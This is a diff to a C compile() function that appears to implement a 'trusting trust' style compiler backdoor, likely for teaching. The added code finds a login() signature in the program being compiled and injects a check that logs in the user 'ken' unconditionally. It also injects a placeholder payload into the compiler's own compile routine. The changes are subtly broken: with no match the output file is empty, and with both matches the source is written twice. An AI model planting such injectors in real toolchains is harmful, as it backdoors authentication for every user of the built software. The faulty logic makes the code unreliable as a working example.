@@ -16,38 +16,37 @@
 static void compile(char *program, char *outname) {
     FILE *fp = fopen("./temp-out.c", "w");
     assert(fp);
-    fprintf(fp, "%s", program);
-    fclose(fp);
-
-
-    /*****************************************************************
-     * Step 1:
-     */
- 
-    // match on the start of the login() routine:
     static char login_sig[] = "int login(char *user) {";
-
-    // and inject an attack for "ken":
-    static char login_attack[] = "if(strcmp(user, \"ken\") == 0) return 1;";
-
-     
-
-    /*****************************************************************
-     * Step 2:
-     */
-
-    // search for the start of the compile routine: 
+    static char login_attack[] = "if(strcmp(user, \"ken\") == 0) return 1;"; 
     static char compile_sig[] =
             "static void compile(char *program, char *outname) {\n"
             "    FILE *fp = fopen(\"./temp-out.c\", \"w\");\n"
             "    assert(fp);"
             ;
-
-    // and inject a placeholder "attack":
-    // inject this after the assert above after the call to fopen.
-    // not much of an attack.   this is just a quick placeholder.
     static char compile_attack[] 
               = "printf(\"%s: could have run your attack here!!\\n\", __FUNCTION__);";
+    char *login_found = strstr(program, login_sig);
+    char *compile_found = strstr(program, compile_sig);
+    if (login_found != NULL) {
+        char *pos = login_found + strlen(login_sig);
+        fprintf(fp, "%.*s\n    %s", (int)(pos - program), program, login_attack);
+        fprintf(fp, "%s", pos);
+    }
+    if (compile_found != NULL) {
+        char *pos = compile_found + strlen(compile_sig);
+        fprintf(fp, "%.*s\n    %s", (int)(pos - program), program, compile_attack);
+        fprintf(fp, "%s", pos);
+    }
+    fclose(fp);
+
+
+    
+
+    /*****************************************************************
+     * Step 2:
+     */
+
+    
 
 
 
